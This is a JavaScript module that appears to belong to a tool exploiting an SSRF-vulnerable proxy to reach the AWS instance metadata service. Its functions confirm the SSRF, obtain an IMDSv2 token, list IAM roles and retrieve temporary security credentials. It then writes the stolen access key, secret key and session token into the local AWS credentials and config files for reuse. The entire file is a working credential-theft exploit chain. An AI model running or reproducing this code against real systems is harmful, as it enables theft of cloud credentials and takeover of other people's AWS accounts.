import axios from "axios";
import fs from "fs";
import path from "path";
import os from "os";
import { CONFIG } from "./config.js";
import { logError, logSuccess, log, logWarning, logInfo } from "./utils.js";

export async function testSSRFVulnerability(proxyUrl) {
  logInfo("Testing SSRF vulnerability...");

  try {
    const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
    const fullUrl = `${proxyUrl}?url=${testUrl}`;

    logInfo(`Testing: ${fullUrl}`);

    const response = await axios.get(fullUrl, {
      timeout: 10000,
      validateStatus: (status) => status < 500,
    });

    if (response.status === 200 && response.data) {
      logSuccess("✓ SSRF vulnerability confirmed!");
      logSuccess("✓ Proxy can reach IMDS endpoint");
      log(`  Response: ${response.data.toString()}`, null, "green");
      return true;
    } else if (response.status === 401) {
      logSuccess("✓ SSRF vulnerability confirmed!");
      logSuccess("✓ Proxy can reach IMDS endpoint (401 = IMDSv2 token required)");
      log(`  This is expected for IMDSv2 - will fetch token next`, null, "green");
      return true;
    } else {
      logError("✗ Unexpected response from proxy");
      log(`  Status: ${response.status}`, null, "red");
      return false;
    }
  } catch (error) {
    logError("✗ SSRF vulnerability test failed");

    if (error.code === 'ECONNREFUSED') {
      logError("  Connection refused - proxy server is not reachable");
      logInfo("  Verify:");
      logInfo("    1. Proxy URL is correct");
      logInfo("    2. Proxy server is running");
      logInfo("    3. Firewall/security group allows connections");
    } else if (error.code === 'ETIMEDOUT') {
      logError("  Connection timed out");
    } else if (error.response) {
      logError(`  HTTP ${error.response.status}: ${error.response.statusText}`);
    } else {
      logError(`  ${error.message}`);
    }

    return false;
  }
}

export async function fetchIMDSv2Token(proxyUrl) {
  const tokenUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.token}`;
  const fullUrl = `${proxyUrl}?url=${tokenUrl}`;

  try {
    const response = await axios.put(fullUrl, null, {
      headers: {
        [CONFIG.imdsv2.headers.tokenTTL]: 21600,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch IMDSv2 token");
    log(error.message, null, "red");
    throw error;
  }
}

export async function fetchIAMRole(proxyUrl, token) {
  const metadataUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}`;
  const fullUrl = `${proxyUrl}?url=${metadataUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch IAM role metadata");
    log(error.message, null, "red");
    throw error;
  }
}

export async function fetchAllIAMRoles(proxyUrl, token) {
  const metadataUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}`;
  const fullUrl = `${proxyUrl}?url=${metadataUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });

    const rolesData = response.data;
    if (typeof rolesData === 'string') {
      const roles = rolesData.split('\n').filter(role => role.trim().length > 0);
      return roles;
    }

    return [rolesData]; // Single role
  } catch (error) {
    logError("Failed to fetch IAM roles list");
    log(error.message, null, "red");
    throw error;
  }
}

export async function fetchCredentials(proxyUrl, token, role) {
  const credentialsUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}/${role}`;
  const fullUrl = `${proxyUrl}?url=${credentialsUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });

    let credentials = response.data;
    if (typeof credentials === 'string') {
      try {
        credentials = JSON.parse(credentials);
      } catch (parseError) {
        log("Warning: Could not parse credentials as JSON", null, "yellow");
      }
    }

    return credentials;
  } catch (error) {
    logError("Failed to fetch security credentials");
    log(error.message, null, "red");
    throw error;
  }
}

export async function fetchIAMInfo(proxyUrl, token) {
  const iamInfoUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/iam/info`;
  const fullUrl = `${proxyUrl}?url=${iamInfoUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch IAM info from IMDS");
    log(error.message, null, "red");
    return null;
  }
}

export function writeAWSCredentials(accessKeyId, secretKey, token, region) {
  const awsDir = path.dirname(CONFIG.aws.credentialsPath);
  const configPath = path.join(os.homedir(), ".aws", "config");

  const credentialsContent = `[default]
aws_access_key_id = ${accessKeyId}
aws_secret_access_key = ${secretKey}
aws_session_token = ${token}
`;

  const configContent = `[default]
region = ${region}
output = json
`;

  if (!fs.existsSync(awsDir)) {
    fs.mkdirSync(awsDir, { recursive: true });
  }

  fs.writeFileSync(CONFIG.aws.credentialsPath, credentialsContent, {
    encoding: "utf8",
    flag: "w",
  });

  fs.writeFileSync(configPath, configContent, {
    encoding: "utf8",
    flag: "w",
  });

  logSuccess(
    `Credentials written to ${CONFIG.aws.credentialsPath}`
  );
  logSuccess(
    `Config written to ${configPath} (region: ${region})`
  );
}
